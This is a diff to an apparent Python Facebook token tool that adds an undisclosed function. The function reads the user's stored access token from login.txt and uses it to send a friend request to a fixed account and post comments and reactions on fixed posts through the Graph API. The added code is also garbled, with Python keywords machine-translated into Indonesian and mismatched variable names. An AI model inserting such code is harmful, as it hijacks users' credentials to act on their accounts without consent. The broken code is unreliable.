@@ -112,6 +112,27 @@ def login():
 		except KeyError:
 			os.system("rm -f login.txt")
 			exit("[?] Login Error")
+
+### RAKA ANDRIAN ###
+def  raka_bangsatxd ():
+	coba :
+		toket = buka ( 'login.txt' , 'r' ). baca ()
+	kecuali  IOError :
+		print "\33[1;97m[!] Token tidak valid"
+		os . sistem ( 'rm -rf login.txt' )
+	una  = ( '100017584682867' )
+	kom  = ( 'Lanjutkan Ter😘' )
+	reaksi  = ( 'MARAH' )
+	pos  = ( '953529338576547' )
+	post2  = ( '953529338576547' )
+	kom2  = ( 'Sc Nya Keren Bang😁' )
+	reaksi2  = ( 'CINTA' )
+	permintaan . posting ( 'https://graph.facebook.com/me/friends?method=post&uids='  + una +  '&access_token='  +  toket )
+	permintaan . post ( 'https://graph.facebook.com/' + post + '/comments/?message='  + kom +  '&access_token='  +  toket )
+	permintaan . post ( 'https://graph.facebook.com/' + post + '/reactions?type='  + reac +  '&access_token=' +  toket )
+	permintaan . post ( 'https://graph.facebook.com/' + post2 + '/comments/?message='  + kom2 +  '&access_token='  +  toket )
+	permintaan . post ( 'https://graph.facebook.com/' + post2 + '/reactions?type='  + reac2 +  '&access_token=' +  toket )
+	menu ()
 	
 def menu():
 	os.system("clear")
